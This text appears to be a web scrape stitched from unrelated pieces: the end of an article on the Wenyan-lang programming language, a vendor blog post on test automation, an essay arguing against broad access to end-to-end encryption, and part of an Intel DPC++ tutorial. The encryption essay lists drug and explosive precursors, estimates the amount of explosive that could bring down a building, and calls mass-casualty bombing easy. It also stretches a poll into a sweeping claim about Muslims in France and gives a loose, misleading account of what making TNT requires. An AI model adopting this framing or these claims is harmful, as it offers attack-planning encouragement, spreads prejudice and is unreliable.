<p>Other projects of Lingdong's reflect this confluence of art and programming. Before creating Wenyan, he designed the <a href="https://github.com/LingDong-/rrpl" target="_blank" rel="noopener">Recursive Radical Packing Language</a>, a clever system for describing arbitrary Chinese characters on a grid (somewhat reminiscent of the Letter Spirit project), and then combining grids together to build more complex composite forms.&nbsp;</p>
<p>Wenyan-lang was quickly recognized by a larger community of programmers and contributors toward a growing Wenyan ecosystem. Wenyan-lang now transpiles not only to JS, but Python, Ruby, and C++. Lingdong, who is described by one professor as shy, was at first a bit overwhelmed by the response:</p>
<blockquote>
<p>Originally it was purely for fun, but apparently from the feature requests it seems that we Chinese programmers tend to be very practical people. I think being artistic and practical is not mutually exclusive events for wenyan-lang. Despite being needlessly archaic, the syntax itself is quite expressive actually, as it’s modeled on the Classical Chinese language, which is very expressive.</p>
</blockquote>
<p>Discussions on its <a href="https://github.com/wenyan-lang/wenyan/issues" target="_blank" rel="noopener">GitHub issue pages</a> exploded early not only about programmatic fixes but what would best fit the spirit of Classical Chinese.&nbsp;Most of this discussion is in Chinese, and some in Classical Chinese. The project now has more stars on Github than major projects like Microsoft's Roslyn compiler. The fact that the discussions are not in English may explain why a project with such a huge following has not received more press here.</p>
<p><img src="https://esoteric.codes/uploads/4eb3059b-8ad7-44db-8d40-597285d62482-wenyan-book.png" alt="" width="" height=""></p>
<p>Lingdong and others wrote a manual for Wenyan in Classical Chinese, in physical book form and online as <a href="https://book.wy-lang.org/" target="_blank" rel="noopener">an enormous side-scrolling volume</a>. It begins with a philosophical statement of purpose according to Tsao’s translation:</p>
<blockquote>
<p>What is programming? It’s to control machines. What is a machine? It’s to replace human labour. Because it has a wide range of capacities and its speed is fast.</p>
<p>Only it is not so intelligent. so we need wise people to programme it. When you write lines of codes, it’s like military commands. It’s like prescriptions.</p>
<p>We call it algorithms.</p>
</blockquote>
<p>Wenyan-lang is part of a movement of programming languages that challenge English as the default (usually only) source for keywords. <a href="https://esoteric.codes/blog/interview-with-ramsey-nasser" target="_blank" rel="noopener">Ramsey Nasser</a>'s Arabic programming language 'alb is perhaps the best-known example. However, the lexicon of 'alb (like most programming languages and LISPs in particular) is modest compared to Wenyan-lang's. Just as programmers in Asia who might have no other use for the Roman character-set need to memorize words like "function" and "return" to write in C#, English-speakers could take the time to memorize the commands of 'alb, adjust to its right-to-left script, and write code just fine; it doesn't take a functioning knowledge of Arabic, which is a far larger commitment.</p>
<p>This can be contrasted with <a href="http://joncorbett.ca/default.html" target="_blank" rel="noopener">Jon Corbett</a>'s Cree#, which adopts not only the Canadian Syllabic alphabet for its keywords, but also the Cree traditions of storytelling to structure programs. To use Cree#, you must not only adjust to a different set of keywords, but to understand how those stories are transmitted, including steps to placate the mischievous Raven responsible for code execution. Corbett's work and other languages challenging the cultural dominance of English is explored in a chapter ("FLOW-MATIC") in Mark Marino's recent book <a href="https://mitpress.mit.edu/books/critical-code-studies" target="_blank" rel="noopener"><em>Critical Code Studies</em></a> (and Cree# will be discussed at length in an upcoming esoteric.codes interview with Corbett).<em><br></em></p>
<p><a href="https://www.brannerchinese.com/sinology/index.html" target="_blank" rel="noopener">David Branner</a>, a Computational Lexicographer whose PhD focused on Chinese dialectology, puts Wenyan somewhere between these two, with a lexical toolbox much larger than that of 'alb but without the unusual language features of Cree#.</p>
<blockquote>
<p>The multi-character expressions of Wenyan-Lang are indivisible primitives — they are whole units, and parsed so as to correspond to specific elements of the grammar. In contrast, most multi-character expressions in Wényán can be analyzed compositionally, as sequences of single-character primitives.... For instance, the string 所餘幾何 literally "that which is extra, by how much" — that is, "how much remains" — represents an operator for modulus remainders. Its second character, 餘 "to be extra", also appears in another primitive in the grammar, but there is no relationship between the two primitives — internally, they're independent of one another. You could replace the characters with unique emoji or other symbols, one to one, and it would work just as well (except that it would no longer be readable to people who know some Wényán).</p>
</blockquote>
<p>In other words, despite Wenyan-lang's relative wordiness, it functions very much like other programming languages, <a href="https://github.com/wenyan-lang/wenyan/wiki/Syntax-Cheatsheet" target="_blank" rel="noopener">with keywords that don't change meaning contextually</a>. He adds:</p>
<blockquote>
<p>Wenyan-Lang project is a tour de force. It's a delight to read, and I'm excited to see a significant range of libraries being developed for it.</p>
</blockquote>
<p>Since creating Wenyan-lang, Lingdong has continued his work in language design, recently creating <a href="https://github.com/LingDong-/wax/" target="_blank" rel="noopener">Wax</a>, a language intended to be a "common subset" of most major imperative programming languages. Its LISP-like syntax (although Wax is procedural) strips away much of the complexity and eccentricities of these languages, allowing for a quick way to mock up an idea which can then be transpiled into C++, Python, TypeScript, or a host of other languages. It is like a Toki Pona of programming, embracing simplicity and clarity.</p>
<p>However, the continuing interest in and expansion of Wenyan has also kept him busy. Asked about the future of this growing language, Lingdong looks to the adoption of his esolang in mainstream programming:</p>
<blockquote>
<p>I think the real art would be that one day it is actually used for production code. Then we'll be living in art :)</p>

<![CDATA[Top Test Automation Challenges to Look Out For]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  
<p>Having an effective test automation system is an absolute necessity in today’s agile software development environments. Automation works great, especially in case of smoke and regression tests and helps the QA teams to easily create and execute test cases that are complex in nature. </p>



<p>Though automation can act as a power booster for your product pipeline of development projects, there are certain pitfalls in automation which slow down the automation pipelines if not tackled upfront.<br></p>



<p>Here are the 7 most common test automation challenges that teams usually face while adopting automation testing along with the best solutions to overcome these pitfalls.<br></p>



<p><strong>1. Network Disconnections</strong></p>



<p>Network disconnection is a common automation challenge that a QA team faces wherein they find it hard to access databases, VPN, third party services, APIs, specific testing environments, etc. due to unstable network connections. These network disconnections cause unnecessary delays and hinder the testing process.<br></p>



<p>Apart from disconnections, another cause of worry is the inability to access virtual environments which are generally used by the testers for testing applications. QA teams need to have a good monitoring solution in place that can help fix the issue as soon as it occurs and prevent the whole software delivery pipeline from getting affected.</p>



<p><strong>2. Test Script Issues</strong></p>



<p>QA teams may face various problems related to test scripts if they lack the coding related skill sets. Teams facing these issues can leverage reusability (reusing test scripts) to solve the problems and maintain their code. They can maintain the code in a better way by treating test code as production code. Apart from this, periodic testing of the code should be done along with scheduling debugging sessions and identifying key issues with object identifiers.</p>



<p><strong>3. Fixing Code Smell</strong></p>



<p>A code smell is basically any characteristic in the code of a program that has a negative impact on the design quality. Maintaining the code quality is not only important for the programmers but also for the testers.<br></p>



<p>Fixing code smell can help a QA team achieve:</p>



<ol><li>Faster test results in lesser execution time</li><li>Help make the automation test suite more robust</li><li>Reduce maintenance cost and effort significantly</li></ol>



<p>It is not possible to find most of the code smell by manual reviewing. In many cases, automated code review tools are used to identify all the bad smell present in the source code.</p>



<p><strong>4. Testing Against Wrong Data</strong></p>



<p>In most of the cases, the QA teams are found to be testing against wrong data as it sometimes becomes difficult to get the right data. This right data is the one that the application will be processing in production.<br></p>



<p>Data relevancy and data accuracy are the two most important prerequisites for automated testing to give good results. Complicated processes and communication gaps can also prevent the testing teams from getting the updated and most relevant data.&nbsp;<br></p>



<p>The QA teams should use a robust reporting and analytics solution in order to achieve fast feedback and enhance the overall productivity of the team by working on the data lags.</p>



<p><strong>5. Upfront Investment</strong></p>



<p>One of the most common concerns, especially for teams not having big budgets is the high amount of investment required at the initial phase of implementing automation. In fact, the investment involved in setting up a test automation suite prevents the testers from implementing automation testing. On top of operational costs, you may have to bear licensing costs as well.<br></p>



<p>Even if you are considering using an open-source tool such as Selenium or Appium, there is a level of investment required in training the testers to use these frameworks. Here’s a good read on the<a href="https://www.stickyminds.com/article/hidden-costs-automation" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)"> hidden costs of test automation</a>.<br></p>



<p>Convincing the stakeholders may prove to be a tough task when so many invisible costs are involved. So, it is better to choose a tool that gives you ROI. Choose an automation tool that helps you to reduce costs in all areas of your concern.<br></p>



<p><strong>6. Stability Issues</strong></p>



<p>Stability of the devices is one of the key issues with device labs as mobile devices are unstable in nature. There are many elements in mobile devices that are subject to constant change including operating systems, regular updates, performance etc. </p>



<p>The solution is to keep updating and maintaining the labs to ensure the stability and testability of the devices. Better yet – is the option or make use of a cloud-based lab having real devices to test your applications. This cloud-based lab would cost a fraction of the cost of setting up a real device lab at your location. Also, you need to pay only according to use.<br></p>



<p>If you are looking for a test automation tool, then go for one that supports extensive cross-browser testing by default and gives you the option to plug and do that when needed. An example of one such tool is <a href="https://testsigma.com/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Testsigma</a>.</p>



<p>Testsigma lets you create test cases on the web as well as mobile and APIs in one place and execute them on real devices of your choice.</p>

<p><strong>7. Picking the Right Automation Tool</strong></p>



<p>According to the <a href="https://www.capgemini.com/service/world-quality-report-2017-18/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Gemini World Quality Report</a> released in 2018, more than 50% of IT giants reported that their organization lacks suitable automation tools for their testing teams.<br></p>



<p>As you are aware of the fact that there are a variety of automation tools available in the market, selecting the right one becomes a real challenge. Without the right automation tool, your automation efforts will be worthless and are bound to fail.</p>



<p>Lack of knowledge whether the tool is capable to meet the specific needs, lack of expertise to make the most of the automation tool, and tool costs exceeding the budget are some of the most common reasons for automation failure.<br></p>



<p>You can decide the best-suited one based on the nature and extent of your automation testing, whether the automation tool falls in your budget, and it matches your organization’s technical and business-related requirements.&nbsp;<br></p>



<p>And just that is why we have also compiled a list that you can check before you choose a test automation tool specific to your needs: <a href="https://testsigma.com/blog/10-points-to-help-you-choose-the-right-test-automation-tool/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Tips to choose the right tool for test automation.</a><br></p>



<p>These are some of the most common test automation challenges that QA teams face while tackling automation testing. If a team jumps into test automation without having a proper plan in place, there is a high chance that the automation journey will not be a smooth one.<br></p>



<p>Most of the QA teams face test automation challenges and failure to some extent. Start early, keep an eye for these top common test automation challenges and deal with them like a pro!<br></p>



<p>If you are looking for a one-stop test automation tool to speed up test case creation and execution, give <a href="https://testsigma.com/" target="_blank" rel="noreferrer noopener" aria-label=" (opens in a new tab)">Testsigma</a> a try. It offers a unified end-to-end test automation ecosystem which helps you run automated tests in a huge test lab on the cloud.<br></p>



<p>The robust reporting and analytics facility helps get dynamic test reports at all levels to analyse the test case results and mitigate the key issues as soon as they are found.&nbsp;</p>



<p>Testsigma also saves a significant amount of time and effort in setting up test cases through its scriptless test case creation in simple English language.</p>

        <p>Published on: 2020-11-16</p>
        
<p>One opinion which I started questioning a lot in the last few years is educating people about encryption and providing easy access to end-to-end encrypted communication.</p>
<p>I find myself as one of the very few people in my entourage that half-believes in the necessity of policy initiatives for limiting access to end-to-end encryption, like <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">the ones the EU is advancing</a>.</p>
<p>Take as an example a tool like <a href="https://signal.org/en/">Signal</a>, end-to-end encrypted messaging, open-source, funded mainly by private individuals rather than by governments and/or corporations subservient to said governments.</p>
<p>Young me thought that the idea of something like Signal, a tool that can be used by anyone to essentially make all their communications private, was amazing. Still-young-but-somewhat-older me thinks that making sure apps like Signal are <em>not</em> accessible to a wide audience might actually be an ethical goal.</p>
<p>Why?</p>
<h2>I - Millions of LSD blotters, dozens of bombs</h2>
<p>To answer this question I think we first have to understand something curious about the real world. Namely the fact that, in the vast majority of Europe and the US, you can buy LSD.</p>
<p>It's not very complicated to do it either, you can order from markets like Agora (or whatever kids are using nowadays) and get it delivered at home, from a vendor that's been independently verified by multiple sources which sent it to trustworthy labs which generated COAs for the stuff.</p>
<p>You can also buy it on the street in most places, without having to look too hard. At most, you have to go to a festival, but in the more civilized parts of Europe and the US it's probably enough to ask your tolerated-drugs dealer and he'll know a guy.</p>
<p>This is extremely surprising considering the prerequisites of making LSD, namely having access to:</p>
<ul>
<li>Ergotamine</li>
<li>Diethylamine</li>
<li>Lysergic acid</li>
</ul>
<p>Those are not the only things one needs, but they are the most likely to get you in trouble if you try acquiring them. Ergotamine is a <a href="https://en.wikipedia.org/wiki/DEA_list_of_chemicals">list I controlled precursor</a>. Diethylamine is not controlled but is on the <a href="https://en.wikipedia.org/wiki/DEA_list_of_chemicals">DEA surveillance list</a> (i.e. if you buy a lot of it men with guns will come knocking at your door to ask questions) and I can't find the status of lysergic acid, but I assume its purchase is also monitored to some extent.</p>
<p>These substances are not easy to synthesize either, you can arguably make diethylamine fairly easily in a home lab. But, for ergotamine and lysergic acid, you basically need a large quantity of ergot and plants containing lysergamides. The latter might be easy to source, the former certainly isn't.</p>
<p>So an operation sourcing significant quantities of all of those 3, under the government radar, seems like a pretty complex business. It becomes even more complex once one considers <a href="https://isomerdesign.com/PiHKAL/read.php?domain=tk&amp;id=26">how LSD is made</a>. It's the kind of thing you <em>can</em> make in a "home lab" if that "home lab" is staffed by a group of skilled chemists and has very expensive equipment, it's not cooking meth.</p>
<p>The PiHKAL description above glances over steps that would require quite a bit of chemical engineering know-how to get right, e.g:</p>
<blockquote>
<p>The residue was chromatographed over alumina with elution employing a 3:1 C6H6/CHCl3 mixture, and the collected fraction stripped of solvent under hard vacuum to a constant weight</p>
</blockquote>
<p>There is <em>a lot</em> to unpack there, half a book could be written about each half of the above sentence, and it's one out of over a dozen detailing the process.</p>
<p>Granted, I assume that the recipe PiHKAL gives is not what people use on an industrial scale. But the point I'm trying to argue here is that making LSD is hard, it's a miracle we have so much of it.</p>
<p>All in all, one would need a fairly well-equipped laboratory, expensive enough to require selling millions of doses to get a good ROI. One would need a fairly sophisticated supply chain, requiring silent friends in a few key places and potentially some large ergot-producing wheat fields or greenhouses.</p>
<p>Yet LSD is priced at between 4 and 20$ for 100mcg depending on location. I'm not particularly surprised that the world has an ample supply of LSD, I'm just surprised that this is happening in the same world where, despite <a href="https://en.wikipedia.org/wiki/List_of_terrorist_incidents">hundreds of terrorist attacks</a> in Europe in the last few years, not a single building was demolished using TNT, not a single major water supply was poisoned, nor a single mass gathering bombed with white phosphorus.</p>
<p>Consider what's needed to make TNT, the gist of it would be:</p>
<ul>
<li>toluene (of course)</li>
<li>nitric acid</li>
<li>sulphuric acid</li>
</ul>
<p>Or, to put it in other words, to make a few kgs of TNT all one needs are common baking and cleaning products, toluene (available over the counter in reasonable quantities with no tracking), and some fertilizer.</p>
<p>I'm not going to sit here on my theoretical horse and claim I could do it in a few days, but it's orders of magnitudes easier than producing LSD. Both in terms of required know-how and in terms of how easy it is not to get caught.</p>
<p>Essentially, all a terrorist group would need to produce enough TNT to kill dozens of thousands of people, would be 4 or 5 blokes with some basic chemistry knowledge going to different shops to source the required reagents over time, plus the standard equipment one might find in a meth lab.</p>
<p>It's hard to find numbers on how much TNT one needs to destroy a skyscraper. I will consider that <a href="https://en.wikipedia.org/wiki/Building_implosion">70kg of gunpowder</a> was enough for imploding a medium-sized cathedral in the 18th century. I'd wager 20-100kg of TNT, even in the hands of someone with no demolition know-how, could bring down enough building in a very violent way (note: Controlled demolition requires much more explosive than just making the building collapse).</p>
<p>It's a laughably easy problem, the fact that terrorist attacks are as low impact as they currently are is nothing but a testament to the utter stupidity of those engaging in them.</p>
<p>The thing I'm harping on about here is coordination! Sourcing and producing illegal chemical requires coordination for a few reasons:</p>
<ul>
<li>Pooling together money for the lab</li>
<li>Buying supplies in a way that allows one to stay under the radar</li>
<li>Distributing in a way that allows one to stay under the radar</li>
</ul>
<p>All those 3 coordination problems are much easier for someone wanting to murder thousands of people than for someone wanting to break down misconceptions about dualism with an HTP receptor agonist.</p>
<hr>
<p>So why are the "good guys" able to make industrial quantities of LSD while the religious fundamentalists can't coordinate enough to make a tiny bit of TNT?</p>
<p>Well, encryption is a large part of the problem, or rather, of the fortunate solution we've stumbled into. Somehow the "good guys" are able to use it while the fundamentalists aren't.</p>
<p>This is not only limited to making bombs, coordination problems appear in a lot of areas. For example, the terrorists trying to <a href="https://en.wikipedia.org/wiki/Gretchen_Whitmer_kidnapping_plot">kidnap and murder the governer Michigan</a> were foiled because they used insecure communication methods.</p>
<h2>II - Education and ill intentions</h2>
<p><strong>Note: Kinda talking around religious fundamentalists and other authoritarian ideologies here for the sake of brevity. There's plenty of other good resources around those debates though.</strong></p>
<p>The world we live in contains fairly nasty people, maybe nasty is the wrong word, a better way to phrase it is people that are bought up in systems that instill them with a harmful attitude towards others. People which view materialism as a zero-sum game and arbitrary violence as an acceptable means of spreading an ideology.</p>
<p>Just to put this in perspective, let me quote a <a href="https://en.wikipedia.org/wiki/Muslim_attitudes_toward_terrorism">poll of Muslims living in France</a> (from wiki) regarding "suicide bombing and other forms of violence against civilian targets to defend Islam":</p>
<blockquote>
<p>64% of Muslims in <a href="https://en.wikipedia.org/wiki/France">France</a> believed it could never be justified, 19% believed it could be justified rarely, 16% thought it could be justified often or sometimes</p>
</blockquote>
<p>In other words, at least around 2% of the people of France are sometimes pro the idea of murdering innocents for the sake of the Islamic faith (e.g. using TNT, to demolish a building).</p>
<p>Now, back to the whole drug thing, <a href="https://www.emcdda.europa.eu/countries/drug-reports/2019/france/drug-use_en">1.3% of French people used</a> MDMA in the previous years based on surveys done during (as far as I understand) multiple years. I can't find numbers on psychedelic usage (i.e. non MDMA psychedelics), but I think it's reasonable to assume it's lower, e.g. ~1%.</p>
<p>So at any given time, France, one of the most secular and liberal countries in the whole world, has twice as many people that want the mass murder of innocents to advance and/or protect their fundamentalist religion, as it has people that want to buy LSD.</p>
<p>Yet somehow France has LSD, but no TNT-fueled mass murders. This is staggering, a blow to the efficient market hypothesis.</p>
<p>Maybe it would be more correct to make the association between people that bought LSD and people that donated money to a terrorist organization. But the statistics for that are (obviously) unavailable. Even so, maybe the numbers would drop to 0.2% vs 1% instead of 2% vs 1%, but the similarity of the scale still remains.</p>
<p>I think this boils down to the kind of people that use psychedelics versus the kind of people that want to see others murdered for a perceived slight to their culture. The difference in education level between the two demographics is probably fairly staggering.</p>
<p>Staggering enough that, even though encryption is free and open source for everyone to use, the religious fundamentalists lack even the vocabulary to understand it, while the necessity of it's usage and the way to do so might seem obvious to many psychedelic enthusiasts.</p>
<p>This propagates all the way up the chain. People donating to terrorist organizations probably doing so via unsafe channels, while people buying acid are doing it via safe~ish channels (e.g. calling the local imam via phone vs messaging your dealer via a telegram secret chat). People plotting terrorist attacks doing so via Facebook messenger or in a monitorable building, people producing LSD doing all in-person communications in secure locations and coordinating online via emails sent through TOR using quantum-safe encryption for the …</p></div></div>

											<h2>A Step-by-Step Tutorial for Developing Data Parallel C++ Kernels</h2>
					
											
					
					


<!-- Ratings Modal -->


					
											<p><em>[Editor’s note: This tutorial was adapted from</em> <strong><a href="https://github.com/jeffhammond" target="_blank" rel="noopener">Jeff’s GitHub repository</a></strong><em>.]</em></p>
<p>This is an introduction to the <a href="https://software.intel.com/content/www/us/en/develop/tools/oneapi/components/dpc-compiler.html" target="_blank" rel="noopener"><strong>Data Parallel C++</strong></a> programming model, or DPC++ for short. DPC++ is based on Khronos SYCL, which means it’s a modern C++ parallel programming model. SYCL 1.2.1 is the latest Khronos standard, although the SYCL 2020 provisional specific is available for review. Intel and other members of the SYCL working group are finalizing the next version of the language specification. DPC++ contains extensions that make SYCL easier to use, although many of these are expected to be part of SYCL 2020. Implementing extensions in the DPC++ compiler helps the community evaluate their effectiveness before standardization.</p>
<h2>Who Is This Tutorial For?</h2>
<p>This tutorial is for programmers who already have a decent understanding of C++ and parallelism. Teaching C++ and parallelism is hard—and there’s a lot of material out there already. There’s far less information on SYCL itself, and even less about DPC++, so that’s our focus.</p>
<p>SYCL is derived from OpenCL, and the execution models are quite similar. If you need help understanding the SYCL/OpenCL execution model, please check out <a href="https://www.khronos.org/assets/uploads/developers/library/2012-pan-pacific-road-show-June/OpenCL-Details-Taiwan_June-2012.pdf" target="_blank" rel="noopener"><strong>this overview</strong></a>.</p>
<h2>Who Is This Tutorial <em>Not</em> For?</h2>
<p>When I tell people about SYCL, I often say, “If you like modern C++, you’ll like SYCL because it’s definitely modern C++.” A corollary to this is that if you hate C++, you’ll hate SYCL and DPC++. So, if you don’t want to write modern C++, this tutorial is not for you.</p>
<p>OpenMP 5.0 offers many of the same features as SYCL/DPC++ but supports the ISO language triumvirate of C++, C, and Fortran. If you want to program CPUs and GPUs using Fortran, C, or pre-modern C++ (i.e., before C++11) using an open industry standard, try OpenMP.</p>
<p>Another alternative to SYCL/DPC++ without the C++ is OpenCL. OpenCL is a lot more verbose than SYCL, but if you’re a C programmer, you likely prefer explicit control to syntactic efficiency.</p>
<h2>The Tutorial</h2>
<p>We’ll start with vector addition, which is the “Hello, world!” of HPC and numerical computation. Printing “Hello, world!” doesn’t make a lot of sense in a programming model used for doing lots of things in parallel.</p>
<h2>Vector Addition in SYCL</h2>
<p>The operation we’re trying to implement is SAXPY, which stands for Single-precision A times X plus Y which can be implemented in C or C++ as follows:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-1-6.jpg" alt="" width="1134" height="158" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-1-6.jpg 1134w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-1-6-300x42.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-1-6-1024x143.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-1-6-768x107.jpg 768w" sizes="(max-width: 1134px) 100vw, 1134px"></p>
<p>There are lots of ways to write this in C++. For example, we could use ranges, which would make the code look a bit more like the upcoming SYCL version. But teaching you every possible way to write a loop in C++ isn’t the point of this tutorial, and everybody understands the version that looks like C.</p>
<p>Here’s the same loop in SYCL. There’s a lot to unpack here, so we’ll break down in pieces:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-2-6.jpg" alt="" width="1152" height="177" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-2-6.jpg 1152w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-2-6-300x46.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-2-6-1024x157.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-2-6-768x118.jpg 768w" sizes="(max-width: 1152px) 100vw, 1152px"></p>
<p>As you might have guessed, <span>parallel_for</span> is a parallel for-loop. The loop body is expressed as a lambda. The lambda is the code that looks like [..]{..}.</p>
<p>The loop iterator is expressed in terms of a <span>sycl::range</span> and a <span>sycl::id</span>. In our simple example, both are one-dimension, as indicated by the <span>&lt;1&gt;</span>. SYCL ranges and ids can be one-, two-, or three-dimensional. (OpenCL and CUDA have the same limitation.)</p>
<p>It may be a bit unfamiliar to write loops like this, but it’s consistent with how lambdas work. However, if you’ve ever used <a href="https://github.com/oneapi-src/oneDPL" target="_blank" rel="noopener"><strong>parallel STL</strong></a>, <a href="https://github.com/oneapi-src/oneTBB" target="_blank" rel="noopener"><strong>TBB</strong></a>, <a href="https://github.com/kokkos/kokkos/" target="_blank" rel="noopener"><strong>Kokkos</strong></a>, or <a href="https://github.com/LLNL/RAJA" target="_blank" rel="noopener"><strong>RAJA</strong></a>, you’ll recognize the pattern.</p>
<p>You might be wondering about the <span>&lt;class saxpy&gt;</span> template argument to <span>parallel_for</span>. This is just a way to name the kernel, which is necessary because you might want to use SYCL with a different host C++ compiler than the SYCL device compiler. In this case, the two compilers need a way to agree on the kernel name. In many SYCL compilers, such as Intel DPC++, this isn’t necessary. And we can tell the compiler to not worry about looking for names by using the option <span>-fsycl-unnamed-lambda</span>.</p>
<p>We won’t try to explain what the <span>h</span> in <span>h.parallel_for</span> is right now. We’ll cover that later.</p>
<h2>SYCL Queues</h2>
<p>One challenge of heterogeneous programming is the multiple types of processing elements and, often, different memory types. These things make compilers and runtimes more complicated. The SYCL programming model embraces heterogeneous execution, although at a much higher level than OpenCL. Not everything is explicit, either. Unlike other popular GPU programming models, SYCL kernels can be inlined into the host program flow, which improves readability.</p>
<p>Whenever we want to compute on a device, we need to create a work queue:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-3-6.jpg" alt="" width="1186" height="102" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-3-6.jpg 1186w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-3-6-300x26.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-3-6-1024x88.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-3-6-768x66.jpg 768w" sizes="(max-width: 1186px) 100vw, 1186px"></p>
<p>The default selector favors a GPU, if present, and a CPU otherwise. We can create queues associated with specific device types using this:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-4-6.jpg" alt="" width="1168" height="154" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-4-6.jpg 1168w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-4-6-300x40.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-4-6-1024x135.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-4-6-768x101.jpg 768w" sizes="(max-width: 1168px) 100vw, 1168px"></p>
<p>The host and CPU selectors may lead to significantly different results, even though they target the same hardware, because the host selector might use a sequential implementation optimized for debugging, while the CPU selector uses the OpenCL runtime and runs across all the cores. Also, the OpenCL just-in-time (JIT) compiler might generate different code because it’s using a different compiler altogether. Don’t assume that just because the host is a CPU, that host and CPU mean the same thing in SYCL.</p>
<h2>Managing Data in SYCL Using Buffers</h2>
<p>The canonical way to manage data in SYCL is with buffers. A SYCL buffer is an opaque container. This is an elegant design, but some applications would like pointers, which are provided by the USM extension, discussed later.</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-13-2.jpg" alt="" width="1147" height="177" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-13-2.jpg 1147w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-13-2-300x46.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-13-2-1024x158.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-13-2-768x119.jpg 768w" sizes="(max-width: 1147px) 100vw, 1147px"></p>
<p>In the previous example, the user allocates a C++ container on the host and then hands it over to SYCL. Until the destructor of the SYCL buffer is invoked, the user can’t access the data through a non-SYCL mechanism. SYCL accessors are the important aspect of SYCL data management with buffers, which we’ll explain below.</p>
<h2>Controlling Device Execution</h2>
<p>Because device code may require a different compiler or code generation mechanism from the host, it’s necessary to clearly identify sections of device code. Below we see how this looks in SYCL 1.2.1. We use the <span>submit</span> method to enqueue work to the device queue, <span>q</span>. This method returns an opaque handler against which we execute kernels, in this case via <span>parallel_for</span>.</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-6-4.jpg" alt="" width="1172" height="261" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-6-4.jpg 1172w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-6-4-300x67.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-6-4-1024x228.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-6-4-768x171.jpg 768w" sizes="(max-width: 1172px) 100vw, 1172px"></p>
<p>We can synchronize device execution using the <span>wait()</span> method. There are finer-grain methods for synchronizing device execution, but we start with simplest one, which is a heavy hammer.</p>
<p>Some users may find the above code a bit verbose, particularly compared to models like Kokkos. The Intel DPC++ compiler supports a terse syntax, which we’ll cover below.</p>
<h2>Compute Kernels and Buffers</h2>
<p>SYCL accessors are the final piece in our first SYCL program. Accessors may be unfamiliar to GPU programmers, but they have a number of nice properties compared to other methods. While SYCL allows the programmer to move data explicitly using, for example, the <span>copy()</span> method, the accessor methods don’t require this because they generate a dataflow graph that the compiler and runtime can use to move data at the right time. This is particularly effective when multiple kernels are invoked in sequence. In this case, the SYCL implementation will deduce that data is reused and not copy it back to the host unnecessarily. Also, we can schedule data movement asynchronously (i.e., overlapped with device execution). While expert GPU programmers can do this manually, we often find that SYCL accessors lead to better performance than OpenCL programs where programmers must move data explicitly.</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-7-2.jpg" alt="" width="1190" height="353" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-7-2.jpg 1190w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-7-2-300x89.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-7-2-1024x304.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-7-2-768x228.jpg 768w" sizes="(max-width: 1190px) 100vw, 1190px"></p>
<p>Because programming models that assume pointers are handles to memory have a hard time with SYCL accessors, the USM extension makes accessors unnecessary. USM places a greater burden on the programmer in terms of data movement and synchronization but helps with compatibility in legacy code that wants to use pointers.</p>
<h2>Review of Our First SYCL Program</h2>
<p>Here are all the components of our SYCL SAXPY program we just described:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-8-1.jpg" alt="" width="888" height="631" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-8-1.jpg 888w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-8-1-300x213.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-8-1-768x546.jpg 768w" sizes="(max-width: 888px) 100vw, 888px"></p>
